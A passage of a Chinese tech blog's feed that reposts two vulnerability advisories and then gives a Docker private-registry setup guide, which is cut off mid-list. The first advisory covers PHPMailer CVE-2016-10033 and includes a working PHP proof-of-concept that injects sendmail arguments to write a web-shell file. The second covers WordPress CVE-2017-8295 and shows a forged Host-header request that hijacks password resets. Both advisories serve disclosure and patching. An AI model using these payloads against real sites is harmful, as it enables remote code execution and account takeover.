<p>漏洞级别</p>
<p>高危</p>
<p>漏洞描述</p>
<p>独立研究人员Dawid Golunski发现了该漏洞——远程攻击者利用该漏洞，可实现远程任意代码在web服务器账户环境中执行，并使web应用陷入威胁中。攻击者主要在常见的web表单如意见反馈表单，注册表单，邮件密码重置表单等使用邮件发送的组件时利用此漏洞。</p>
<p>不过有关该漏洞的细节信息，研究人员并未披露，期望给予网站管理员更多的时间来升级PHPMailer类，避免受漏洞影响。    </p>
<p>漏洞PoC</p>
<p>实际上Dawid Golunski已经做了个可行的RCE PoC，不过会迟一些再发布。关注视频PoC请点击：<a href="https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html" target="_blank" rel="external">https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html</a></p>
<p>更新：PoC代码已经公布，请站长们尽快升级！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">更新：PoC代码已经公布，请站长们尽快升级！</div><div class="line"></div><div class="line">&lt;?php </div><div class="line">/* </div><div class="line">PHPMailer &lt; 5.2.18 Remote Code Execution (CVE-2016-10033) </div><div class="line">A simple PoC (working on Sendmail MTA) </div><div class="line">It will inject the following parameters to sendmail command: </div><div class="line">Arg no. 0 == [/usr/sbin/sendmail] </div><div class="line">Arg no. 1 == [-t] </div><div class="line">Arg no. 2 == [-i] </div><div class="line">Arg no. 3 == [-fattacker\] </div><div class="line">Arg no. 4 == [-oQ/tmp/] </div><div class="line">Arg no. 5 == [-X/var/www/cache/phpcode.php] </div><div class="line">Arg no. 6 == [some&quot;@email.com] </div><div class="line">which will write the transfer log (-X) into /var/www/cache/phpcode.php file. </div><div class="line">The resulting file will contain the payload passed in the body of the msg: </div><div class="line">09607 &lt;&lt;&lt; --b1_cb4566aa51be9f090d9419163e492306 </div><div class="line">09607 &lt;&lt;&lt; Content-Type: text/html; charset=us-ascii </div><div class="line">09607 &lt;&lt;&lt; </div><div class="line">09607 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt; </div><div class="line">09607 &lt;&lt;&lt; </div><div class="line">09607 &lt;&lt;&lt; </div><div class="line">09607 &lt;&lt;&lt; </div><div class="line">09607 &lt;&lt;&lt; --b1_cb4566aa51be9f090d9419163e492306-- </div><div class="line">See the full advisory URL for details. </div><div class="line">*/ </div><div class="line">// Attacker&apos;s input coming from untrusted source such as $_GET , $_POST etc. </div><div class="line">// For example from a Contact form </div><div class="line">$email_from = &apos;&quot;attacker\&quot; -oQ/tmp/ -X/var/www/cache/phpcode.php  some&quot;@email.com&apos;; </div><div class="line">$msg_body  = &quot;&lt;?php phpinfo(); ?&gt;&quot;; </div><div class="line">// ------------------ </div><div class="line">// mail() param injection via the vulnerability in PHPMailer </div><div class="line">require_once(&apos;class.phpmailer.php&apos;); </div><div class="line">$mail = new PHPMailer(); // defaults to using php &quot;mail()&quot; </div><div class="line">$mail-&gt;SetFrom($email_from, &apos;Client Name&apos;); </div><div class="line">$address = &quot;customer_feedback@company-X.com&quot;; </div><div class="line">$mail-&gt;AddAddress($address, &quot;Some User&quot;); </div><div class="line">$mail-&gt;Subject    = &quot;PHPMailer PoC Exploit CVE-2016-10033&quot;; </div><div class="line">$mail-&gt;MsgHTML($msg_body); </div><div class="line">if(!$mail-&gt;Send()) &#123; </div><div class="line">echo &quot;Mailer Error: &quot; . $mail-&gt;ErrorInfo; </div><div class="line">&#125; else &#123; </div><div class="line">echo &quot;Message sent!\n&quot;; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>漏洞修复</p>
<p>更新到5.2.18：<a href="https://github.com/PHPMailer/PHPMailer" target="_blank" rel="external">https://github.com/PHPMailer/PHPMailer</a></p>
<p>漏洞详情目前已经提交给了PHPMailer官方——官方也已经发布了PHPMailer 5.2.18紧急安全修复，解决上述问题，受影响的用户应当立即升级。详情可参见：</p>
<p><a href="https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md" target="_blank" rel="external">https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md</a></p>
<p><a href="https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md" target="_blank" rel="external">https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md</a></p>
<p>*本文转自FreeBuf.COM    </p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;【2017-5-4更新】&quot;&gt;&lt;a href=&quot;#【2017-5-4更新】&quot; class=&quot;headerlink&quot; title=&quot;【2017.5.4更新】&quot;&gt;&lt;/a&gt;【2017.5.4更新】&lt;/h2&gt;&lt;p&gt;昨天曝出了两个比较热门的漏洞，一个是CVE-2016-100
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WordPress" scheme="http://blog.unixmen.cn/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>WordPress爆未经授权的密码重置漏洞</title>
    <link href="http://blog.unixmen.cn/2017/05/05/WordPress%E7%88%86%E6%9C%AA%E7%BB%8F%E6%8E%88%E6%9D%83%E7%9A%84%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://blog.unixmen.cn/2017/05/05/WordPress爆未经授权的密码重置漏洞/</id>
    <published>2017-05-05T01:14:35.000Z</published>
    <updated>2017-05-05T01:28:24.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>漏洞提交者：Dawid Golunski<br>漏洞编号：CVE-2017-8295<br>发布日期：2017-05-03<br>修订版本：1.0<br>漏洞危害：中/高</p>
</blockquote>
<h2 id="I-漏洞"><a href="#I-漏洞" class="headerlink" title="I. 漏洞"></a>I. 漏洞</h2><p>WordPress内核&lt;= 4.7.4存在未经授权的密码重置(0day)</p>
<h2 id="II-背景"><a href="#II-背景" class="headerlink" title="II. 背景"></a>II. 背景</h2><p>WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。截止2017年2月，Alexa排名前1000万的站点中约有27.5%使用该管理系统。据报道有超过6000万站点使用WordPress进行站点管理或者作为博客系统。</p>
<h2 id="III-介绍"><a href="#III-介绍" class="headerlink" title="III. 介绍"></a>III. 介绍</h2><p>WordPress的重置密码功能存在漏洞，在某些情况下不需要使用之前的身份令牌验证获取密码重置链接。<br>该攻击可导致攻击者在未经授权的情况下获取用户Wordpress后台管理权限。</p>
<h2 id="IV-描述"><a href="#IV-描述" class="headerlink" title="IV. 描述"></a>IV. 描述</h2><p>该漏洞源于WordPress默认使用不可信的数据。当生成一个密码重置邮件时应当是仅发送给与帐户相关联的电子邮件。<br>从下面的代码片段可以看出，在调用PHP mail()函数前创建了一个From email头</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">------[ wp-includes/pluggable.php ]------</div><div class="line"></div><div class="line">if ( !isset( $from_email ) ) &#123;</div><div class="line">        // Get the site domain and get rid of www.</div><div class="line">        $sitename = strtolower( $_SERVER[&apos;SERVER_NAME&apos;] );</div><div class="line">        if ( substr( $sitename, 0, 4 ) == &apos;www.&apos; ) &#123;</div><div class="line">                $sitename = substr( $sitename, 4 );</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $from_email = &apos;wordpress@&apos; . $sitename;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">-----------------------------------------</div></pre></td></tr></table></figure>
<p>正如我们所看到的，Wordpress为了生成重置邮件创建的一个From/Return-Path(发件人/收件人)头，使用SERVER_NAME变量以获取服务器的主机名。<br>然而，诸如Apache的主流web服务器默认使用由客户端提供的主机名来设置SERVER_NAME变量（<a href="https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname" target="_blank" rel="external">参考Apache文档</a>）<br>由于SERVER_NAME可以进行修改，攻击者可以任意设置该值，例如attackers-mxserver.com<br>这将导致Wordpress的$from_email变为wordpress@attackers-mxserver.com，最终导致包含From/Return-Path(发件人/收件人)设置的密码重置邮件发送到了该恶意邮件地址。<br>至于攻击者可以修改哪那一封电子邮件的头信息，这取决于服务器环境（<a href="http://php.net/manual/en/function.mail.php" target="_blank" rel="external">参考PHP文档</a>）<br>基于邮件服务器的配置，可能导致被修改过邮件头的恶意收件人/发件人地址的电子邮件发送给WordPress用户。<br>这使得攻击者能够在不需要进行交互就可以截取本该是需要进行交互才能进行的操作的密码重置邮件。</p>
<blockquote>
<p>攻击场景：<br>如果攻击者知道用户的电子邮件地址。为了让密码重置邮件被服务器拒收，或者无法到达目标地址。他们可以先对用户的电子邮件帐户进行DoS攻击（通过发送多个超过用户磁盘配额的大文件邮件或攻击该DNS服务器）<br>某些自动回复可能会附加有邮件发送副本<br>发送多封密码重置邮件给用户，迫使用户对这些没完没了的密码重置邮件进行回复，回复中就包含的密码链接会发送给攻击者。</p>
<h2 id="V-POC"><a href="#V-POC" class="headerlink" title="V. POC"></a>V. POC</h2></blockquote>
<p>如果攻击者将类似下面的请求发送到默认可通过IP地址访问的Wordpress安装页面(IP-based vhost):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-----[ HTTP Request ]----</div><div class="line"></div><div class="line">POST /wp/wordpress/wp-login.php?action=lostpassword HTTP/1.1</div><div class="line">Host: injected-attackers-mxserver.com</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 56</div><div class="line"></div><div class="line">user_login=admin&amp;redirect_to=&amp;wp-submit=Get+New+Password</div></pre></td></tr></table></figure></p>
<hr>
<p>WordPress将触发管理员账户的密码重置功能<br>由于修改了主机头，SERVER_NAME变量将被设置为攻击者所选择的主机名，因此Wordpress会将以下电子邮件头信息和正文传递给/usr/bin/sendmail<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">------[ resulting e-mail ]-----</div><div class="line"></div><div class="line">Subject: [CompanyX WP] Password Reset</div><div class="line">Return-Path: &lt;wordpress@attackers-mxserver.com&gt;</div><div class="line">From: WordPress &lt;wordpress@attackers-mxserver.com&gt;</div><div class="line">Message-ID: &lt;e6fd614c5dd8a1c604df2a732eb7b016@attackers-mxserver.com&gt;</div><div class="line">X-Priority: 3</div><div class="line">MIME-Version: 1.0</div><div class="line">Content-Type: text/plain; charset=UTF-8</div><div class="line">Content-Transfer-Encoding: 8bit</div></pre></td></tr></table></figure></p>
<p>有人请求将以下账户的密码进行重置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://companyX-wp/wp/wordpress/</div><div class="line">Username: admin</div></pre></td></tr></table></figure></p>
<p>如果是弄错了，直接忽略该邮件就好。重置密码请访问以下地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://companyx-wp/wp/wordpress/wp-login.php?action=rp&amp;key=AceiMFmkMR4fsmwxIZtZ&amp;login=admin%3E</div></pre></td></tr></table></figure></p>
<p>正如我们看到的，Return-Path, From, 以及Message-ID字段都是攻击者控制的域<br>通过bash脚本替换/usr/sbin/sendmail以执行头的验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">cat &gt; /tmp/outgoing-email</div></pre></td></tr></table></figure></p>
<h2 id="VI-业务影响"><a href="#VI-业务影响" class="headerlink" title="VI. 业务影响"></a>VI. 业务影响</h2><p>在利用成功的基础上，攻击者可重置用户密码并且未经授权获取WordPress账户访问权限。</p>
<h2 id="VII-系统影响"><a href="#VII-系统影响" class="headerlink" title="VII. 系统影响"></a>VII. 系统影响</h2><p>WordPress至最新版本4.7.4全部受影响</p>
<h2 id="VIII-解决方案"><a href="#VIII-解决方案" class="headerlink" title="VIII. 解决方案"></a>VIII. 解决方案</h2><p>目前没有官方解决方案可用。作为临时解决方案，用户可以启用UseCanonicalName执行SERVER_NAME静态值（<a href="https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname" target="_blank" rel="external">参考Apache</a>）</p>
<h2 id="IX-参考文献"><a href="#IX-参考文献" class="headerlink" title="IX. 参考文献"></a>IX. 参考文献</h2><p><a href="https://legalhackers.com" target="_blank" rel="external">https://legalhackers.com</a></p>
<p><a href="https://ExploitBox.io" target="_blank" rel="external">https://ExploitBox.io</a></p>
<p>Vendor site:</p>
<p><a href="https://wordpress.org" target="_blank" rel="external">https://wordpress.org</a></p>
<p><a href="http://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname" target="_blank" rel="external">http://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname</a></p>
<p><a href="http://php.net/manual/en/function.mail.php" target="_blank" rel="external">http://php.net/manual/en/function.mail.php</a></p>
<p><a href="https://tools.ietf.org/html/rfc5321" target="_blank" rel="external">https://tools.ietf.org/html/rfc5321</a></p>
<blockquote>
<p>转自FreeBuf.com</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;漏洞提交者：Dawid Golunski&lt;br&gt;漏洞编号：CVE-2017-8295&lt;br&gt;发布日期：2017-05-03&lt;br&gt;修订版本：1.0&lt;br&gt;漏洞危害：中/高&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;I-漏洞&quot;&gt;&lt;a hre
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WordPress" scheme="http://blog.unixmen.cn/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>Docker私有镜像仓库节点部署</title>
    <link href="http://blog.unixmen.cn/2017/05/02/Docker%E7%A7%81%E6%9C%89%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"/>
    <id>http://blog.unixmen.cn/2017/05/02/Docker私有镜像仓库节点部署/</id>
    <published>2017-05-02T09:42:29.000Z</published>
    <updated>2017-05-02T10:00:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于本文"><a href="#关于本文" class="headerlink" title="关于本文"></a>关于本文</h2><p>本文简介生产环境中私有镜像仓库节点的部署及自定义环境配置。</p>
<h2 id="硬件要求"><a href="#硬件要求" class="headerlink" title="硬件要求"></a>硬件要求</h2><p>生产环境中要安装或升级容器私有镜像仓库节点，需要硬件必须满足下列要求：</p>
<table>
<thead>
<tr>
<th></th>
<th>最小</th>
<th>推荐</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>CPU</td>
<td>1 core</td>
<td>大于4 core</td>
<td></td>
</tr>
<tr>
<td>内存</td>
<td>1 GB</td>
<td>大于32 GB</td>
<td></td>
</tr>
<tr>
<td>磁盘</td>
<td>5 GB</td>
<td>大于120 GB</td>
<td>小于 5GB 仍然可以安装，Docker 对磁盘需求较大，要确保 Docker 的 Graph Dir(/var/lib/docker) 在较大磁盘分区上</td>
</tr>
<tr>
<td>独立数据盘</td>
<td>RHEL/CentOS 需要 &gt; 5GB 独立数据盘</td>
<td>RHEL/CentOS 需要 &gt;30GB 独立数据盘</td>
<td>需要使用 devicemapper 的 direct-lvm 模式</td>
</tr>
<tr>
<td>网络</td>
<td>所有节点互通</td>
<td>所有节点互通, ping &lt;1ms</td>
<td>至少两块网卡</td>
</tr>
</tbody>
</table>
<p>##系统要求</p>
<p>系统推荐：CentOS 7.2 </p>
<p>内核推荐：大于3.10</p>
<p>注：默认第一块网卡为内网</p>
<h2 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h2><ul>
<li><p>安装ntpd服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install ntp</div></pre></td></tr></table></figure>
</li>
<li><p>与上游ntp服务器进行时间同步</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntpdate 10.154.88.88</div></pre></td></tr></table></figure>
</li>
<li><p>配置ntp服务配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sed -i &apos;s/0.centos.pool.ntp.org iburst/10.154.88.88/g&apos;  /etc/ntp.conf</div></pre></td></tr></table></figure>
</li>
<li><p>启动ntpd服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">systemctl enable ntpd</div><div class="line">systemctl start ntpd</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="配置本地存储"><a href="#配置本地存储" class="headerlink" title="配置本地存储"></a>配置本地存储</h2><p>为方便后期维护管理，采用LVM对本地存储进行管理</p>
<ul>
<li><p>创建PV</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pvcreate /dev/sdb</div></pre></td></tr></table></figure>
</li>
<li><p>创建VG</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vgcreate data /dev/sdb</div></pre></td></tr></table></figure>
</li>
<li><p>创建LV</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lvcreate -L 500G data -n docker_data</div></pre></td></tr></table></figure>
</li>
<li><p>格式化新分区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkfs.xft /dev/data/docker_data</div></pre></td></tr></table></figure>
</li>
</ul>
<p>##系统更新</p>
<p>为了提供更稳定的基础环境，建议对宿主机的底层环境进行更新升级。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum update -y</div></pre></td></tr></table></figure></p>
<p>##安装容器服务</p>
<ul>
<li><p>卸载系统默认（版本较老的）Docker环境包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">yum -y remove docker docker-common container-selinux</div><div class="line">yum -y remove docker-selinux</div></pre></td></tr></table></figure>
</li>
<li><p>配置官方软件仓库源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">yum install -y yum-utils</div><div class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</div></pre></td></tr></table></figure>
</li>
<li><p>更新本地缓存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum makecache fast</div></pre></td></tr></table></figure>
</li>
<li><p>查看软件包信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum list docker-ce.x86_64  --showduplicates |sort -r</div></pre></td></tr></table></figure>
</li>
<li><p>安装Docker engine社区版</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install docker-ce</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="本地容器服务配置"><a href="#本地容器服务配置" class="headerlink" title="本地容器服务配置"></a>本地容器服务配置</h2><ul>
<li><p>启动容器服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start docker</div></pre></td></tr></table></figure>
</li>
<li><p>设置开机启动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl enable docker</div></pre></td></tr></table></figure>
</li>
<li><p>设置容器数据存储路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">systemctl stop docker</div><div class="line">mv /var/lib/docker&#123;,.bak&#125;</div><div class="line">mkdir /var/lib/docker</div><div class="line">mount /dev/data/docker_data /var/lib/docker</div><div class="line">echo &quot;/dev/data/docker_data   /var/lib/docker         xfs     defaults 1 0&quot; &gt;&gt;/etc/fstab</div></pre></td></tr></table></figure>
</li>
<li><p>配置加速器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://xxxxxxxxxx.m.daocloud.io</div></pre></td></tr></table></figure>
</li>
<li><p>启动容器服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start docker</div></pre></td></tr></table></figure>
</li>
<li><p>测试运行实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run hello-world</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="创建私有镜像仓库镜像存放分区"><a href="#创建私有镜像仓库镜像存放分区" class="headerlink" title="创建私有镜像仓库镜像存放分区"></a>创建私有镜像仓库镜像存放分区</h2><ul>
<li><p>创建LV</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lvcreate -L 2000G data -n registry_data</div></pre></td></tr></table></figure>
</li>
<li><p>格式化新分区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkfs.xft /dev/data/registry_data</div></pre></td></tr></table></figure>
</li>
<li><p>挂载新分区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount  /dev/data/registry_data /data/docker/registry/</div></pre></td></tr></table></figure>
</li>
<li><p>修改系统启动挂载分区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &quot;/dev/data/registry_data  /data/registry_data         xfs     defaults 1 0&quot; &gt;&gt;/etc/fstab</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="启动私有镜像仓库"><a href="#启动私有镜像仓库" class="headerlink" title="启动私有镜像仓库"></a>启动私有镜像仓库</h2><p>registry 是Docker官方提供的私有镜像仓库工具，可以用于构建私有的镜像仓库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -d -p 5000:5000 -v /data/docker/registry/:/var/lib/registry registry:latest</div></pre></td></tr></table></figure>
<h2 id="私有镜像仓库测试"><a href="#私有镜像仓库测试" class="headerlink" title="私有镜像仓库测试"></a>私有镜像仓库测试</h2><ul>
<li>查看本地镜像<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@docker-registry ~]# docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">busybox             latest              00f017a8c2a6        2 weeks ago         1.11 MB</div><div class="line">registry            latest              047218491f8c        2 weeks ago         33.2 MB</div></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到，本机共有两个容器镜像，分别是：registry和busybox</p>
<ul>
<li><p>重新标记一个本地镜像为私有仓库的版本，这里将本地的busybox标记为本地IP:5000/busybox</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker tag busybox 10.82.2.103:5000/busybox</div></pre></td></tr></table></figure>
</li>
<li><p>再次查看本地镜像<br>再次查看镜像可以看到多了一个标记为10.82.2.103:5000/busybox的镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@docker-registry ~]# docker images</div><div class="line">REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">10.82.2.103:5000/busybox   latest              00f017a8c2a6        2 weeks ago         1.11 MB</div><div class="line">busybox                     latest              00f017a8c2a6        2 weeks ago         1.11 MB</div><div class="line">registry                    latest              047218491f8c        2 weeks ago         33.2 MB</div></pre></td></tr></table></figure>
</li>
<li><p>将本地镜像推送到本地仓库中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker push 10.82.2.103:5000/busybox</div></pre></td></tr></table></figure>
</li>
<li><p>推送过程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@docker-registry ~]# docker push 10.82.2.103:5000/busybox</div><div class="line">The push refers to a repository [10.82.2.103:5000/busybox]</div><div class="line">c0de73ac9968: Pushed </div><div class="line">latest: digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5 size: 527</div></pre></td></tr></table></figure>
</li>
<li><p>查看本地仓库中的镜像列表</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl  10.82.2.103:5000/v2/busybox/tags/list</div></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;name&quot;:&quot;busybox&quot;,&quot;tags&quot;:[&quot;latest&quot;]&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li><p>删除本地busybox镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@docker-registry ~]# docker rmi busybox</div><div class="line">Untagged: busybox:latest</div><div class="line">Untagged: busybox@sha256:32f093055929dbc23dec4d03e09dfe971f5973a9ca5cf059cbfb644c206aa83f</div><div class="line">[root@docker-registry ~]# docker images</div><div class="line">REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">10.82.2.103:5000/busybox   latest              00f017a8c2a6        2 weeks ago         1.11 MB</div><div class="line">registry                    latest              047218491f8c        2 weeks ago         33.2 MB</div></pre></td></tr></table></figure>
</li>
<li><p>从私有仓库拉取镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@docker-registry ~]# docker pull 10.82.2.103:5000/busybox</div><div class="line">Using default tag: latest</div><div class="line">latest: Pulling from busybox</div><div class="line">Digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5</div><div class="line">Status: Image is up to date for 10.82.2.103:5000/busybox:latest</div></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到成功获取私有仓库中的镜像</p>
<ul>
<li><p>尝试从私有镜像仓库中拉取的镜像启动容器</p>
